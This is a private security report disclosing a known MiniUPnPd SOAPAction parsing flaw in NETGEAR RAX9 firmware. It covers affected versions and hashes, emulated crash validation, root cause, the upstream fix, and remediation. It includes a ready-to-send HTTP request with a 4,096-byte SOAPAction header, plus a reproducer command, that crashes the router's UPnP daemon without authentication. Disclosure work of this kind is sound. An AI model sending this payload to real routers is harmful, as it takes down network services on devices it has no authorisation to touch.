# Private security report: NETGEAR RAX9 unauthenticated MiniUPnPd DoS

Date: 2026-07-24 UTC

## Summary

The current NETGEAR RAX9 V1.0.9.44 firmware contains a remotely reachable
MiniUPnPd SOAPAction parser that can be terminated by an unauthenticated LAN
client. A balanced, approximately 4 KiB `SOAPAction` value without the `#`
separator causes the genuine firmware daemon to exit from `SIGSEGV`.

This report does not claim a zero-day or remote code execution. The fault is
an affected-product instance of MiniUPnP issue #675, whose unbounded
`strchr(action, '#')` operation and `memchr(action, '#', n)` fix were public
in December 2023. The product-level concern is that the current RAX9 firmware
still contains and exposes the affected logic.

## Affected product

- Product: NETGEAR RAX9
- Firmware: V1.0.9.44
- Official archive:
  `https://www.downloads.netgear.com/files/GDC/RAX9/RAX9_V1.0.9.44_1.zip`
- Archive SHA-256:
  `207be4378bed22e68e647b6f80ea6e810be442c824b5da31a3d14b13ae14cd1a`
- Image SHA-256:
  `e603430bf8fa9d8d813cd9703a9bf4a00b5e90c0a36be4c7acb7be20425abc72`
- `/usr/bin/miniupnpd` SHA-256:
  `6e0d171c614b31441e0b215ff7a81092c0dd45e3a7ca46dc075c9786836e4d39`
- Reported server version: `MiniUPnPd/1.6`
- Default service scope: unauthenticated LAN UPnP

V1.0.3.32 is also affected. Its daemon SHA-256 is
`0c3cbb19c6fbc9d68defc11416968f690a541d4cbfc3a0979c014c24cb4f92c3`.

## Reproduction

Send the following request to the router's LAN-side MiniUPnPd HTTP listener.
`A × 4096` means 4,096 literal `A` bytes.

```http
POST /control HTTP/1.1
Host: ROUTER_LAN_IP:UPNP_PORT
SOAPAction: "FRIDAY_RAX9_SOAPACTION_DOS_[A × 4096]"
Content-Length: 13

AAAAAAAAAAAAA
```

The repository reproducer constructs the exact request:

```text
python3 scripts/reproduce_rax9_upnp_soapaction_dos.py \
  --host ROUTER_LAN_IP --port UPNP_PORT --length 4096
```

Expected behavior: the daemon rejects the invalid action without losing
service availability.

Observed behavior: the connection closes and the daemon terminates with
`SIGSEGV`.

## Controlled validation

Testing used the genuine firmware binaries and shared libraries in disposable
Docker containers with `NetworkMode=none`. A narrow compatibility shim
handled only hardware-private startup operations and did not parse or modify
HTTP data.

Two independent clean V1.0.3.32 runs produced:

1. 2,048-byte action: daemon exit 139, `oom=false`.
2. Valid `GetExternalIPAddress`: HTTP 200; 4,096-byte action: daemon exit 139,
   `oom=false`.

The exact V1.0.9.44 daemon then produced:

1. Valid `GetExternalIPAddress`: HTTP 200.
2. 4,096-byte action: daemon exit 139, `oom=false`.

The final log in each crashing run included:

```text
HTTP REQUEST : POST /control (HTTP/1.1)
SOAPAction: FRIDAY_RAX9_SOAPACTION_DOS_AAAA...
Segmentation fault (core dumped)
```

The lower crash boundary varies with memory layout, as expected for an
unbounded read reaching the next unmapped page. The 4,096-byte request is the
reliable reproducer.

## Root cause

Debugger attribution on V1.0.3.32 caught the firmware libc character search
reading an unmapped page while looking for byte `0x23` (`#`). The request
marker was present at the searched buffer. The caller invokes an unbounded
character search before proving that the separator lies inside the bounded
SOAPAction value.

MiniUPnP upstream corrected the same operation by replacing:

```c
p = strchr(action, '#');
if (p && (p - action) < n) {
```

with:

```c
p = memchr(action, '#', n);
if (p) {
```

## Impact and suggested classification

- Attack vector: adjacent network / LAN
- Authentication: none
- User interaction: none
- Impact: reliable loss of the UPnP daemon until it is restarted
- Observed memory safety effect: out-of-bounds read followed by `SIGSEGV`
- Demonstrated RCE: no
- Novel zero-day: no; upstream root cause and fix predate the firmware

Suggested remediation is to backport the bounded MiniUPnP SOAPAction parsing
fix and audit the vendor fork for the related follow-up parser corrections.

## References and artifacts

- MiniUPnP issue #675:
  `https://github.com/miniupnp/miniupnp/issues/675`
- Upstream bounded-search fix:
  `https://github.com/miniupnp/miniupnp/commit/84cd9e62899a091fe73d17596cc7ab97109b8993`
- NETGEAR V1.0.9.44 release page:
  `https://kb.netgear.com/000066576/RAX9-Firmware-Version-1-0-9-44`
- Reproducer: `scripts/reproduce_rax9_upnp_soapaction_dos.py`
- Compatibility shim: `known_firmware/emulation/RAX9/rax9_ioctl_shim.c`
- Detailed debugger record:
  `private_disclosures/RAX9/RAX9_V1.0.3.32_PREAUTH_RCE_DOS_TRIAGE_2026-07-24.md`
